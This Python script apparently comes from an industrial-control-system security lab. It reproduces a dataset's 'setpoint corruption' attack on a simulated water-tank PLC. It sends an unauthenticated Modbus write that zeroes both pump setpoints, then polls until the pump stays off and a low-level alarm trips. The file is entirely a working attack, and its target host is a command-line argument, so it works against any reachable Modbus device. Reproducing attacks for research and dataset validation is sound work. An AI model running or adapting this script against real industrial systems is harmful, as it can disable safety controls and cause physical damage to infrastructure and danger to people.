#!/usr/bin/env python3
"""
setpoint_attack.py -- reproduces the Morris ICS dataset's "Class 7" attack
(the most severe category, 14.4% of the 236,179 water-tank records):
corrupting the PLC's setpoint registers via an unauthenticated Modbus write,
rather than fuzzing the protocol parser itself.

Modbus TCP has no authentication -- any client that can reach port 502/5020
can issue Function Code 16 (Write Multiple Registers) against the setpoints
exactly like a legitimate SCADA operator would. This script is that write:
    setpoint_H, setpoint_L <- 0, 0

Consequence, from plc_sim.py's hysteresis logic:
    if water_level >= sp_H(=0): pump = OFF   <- always true (level > 0)
    elif water_level <= sp_L(=0): pump = ON  <- never reached in practice
The pump is forced permanently OFF regardless of how low the tank runs,
draining it past the *hardware* LL safety limit (10%) that isn't itself a
Modbus register and can't be fixed by any amount of re-reading -- exactly
the "setpoint corruption" pattern the Morris dataset labels Class 7.
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient

REG_LEVEL, REG_PUMP, REG_ALARM, REG_SP_H, REG_SP_L = 0, 1, 2, 3, 4


def read_state(client):
    r = client.read_holding_registers(0, count=5)
    if r.isError():
        raise RuntimeError(f"read failed: {r}")
    return r.registers  # [level, pump, alarm, sp_H, sp_L]


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5020)
    ap.add_argument("--watch-seconds", type=int, default=20,
                     help="How long to poll after the attack to show the level draining")
    args = ap.parse_args()

    client = ModbusTcpClient(args.host, port=args.port)
    if not client.connect():
        print(f"[!] Could not connect to {args.host}:{args.port} -- is plc_sim.py running?")
        return 1

    before = read_state(client)
    print(f"[*] Baseline : level={before[0]}% pump={'ON' if before[1] else 'OFF'} "
          f"alarm={before[2]} spH={before[3]} spL={before[4]}")

    print("[!] Sending unauthenticated write: setpoint_H=0, setpoint_L=0 "
          "(Modbus TCP has no auth -- this is exactly what a legitimate "
          "SCADA client's write looks like on the wire)")
    result = client.write_registers(REG_SP_H, [0, 0])  # writes REG_SP_H and REG_SP_L
    if result.isError():
        print(f"[!] Write rejected: {result}")
        return 1

    print(f"[*] Polling for {args.watch_seconds}s to observe the consequence "
          f"(pump forced OFF -- tank drains past the {10}% hardware LL limit)...")
    start = time.time()
    while time.time() - start < args.watch_seconds:
        level, pump, alarm, sp_h, sp_l = read_state(client)
        print(f"    t+{time.time()-start:4.1f}s  level={level:3d}%  pump={'ON ' if pump else 'OFF'}  "
              f"alarm={'LL!' if alarm else '-  '}  spH={sp_h} spL={sp_l}")
        if alarm:
            print("[X] LL (low-level / cavitation) alarm triggered -- Class 7 setpoint "
                  "corruption reproduced.")
            client.close()
            return 0
        time.sleep(1)

    print("[?] Alarm not observed within watch window -- tank may not have drained "
          "far enough yet; try --watch-seconds with a larger value.")
    client.close()
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
